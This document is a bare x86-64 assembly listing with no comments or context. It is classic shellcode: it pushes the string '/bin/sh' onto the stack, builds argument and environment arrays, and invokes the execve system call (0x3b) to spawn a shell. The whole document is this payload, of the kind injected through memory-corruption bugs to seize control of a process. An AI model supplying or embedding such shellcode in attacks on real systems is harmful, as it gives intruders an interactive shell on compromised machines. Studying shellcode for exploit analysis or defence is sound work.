xor     rax, rax
sub     rsp, 0x70
push    rax
mov     rdx, rsp
mov     rbx, 0x68732f6e69622fff
shr     rbx, 8
push    rbx
mov     rdi, rsp
push    rax
push    rdx
mov     rdx, rsp
push    rax
push    rdi
mov     rsi, rsp
mov     al, 0x3b
syscall
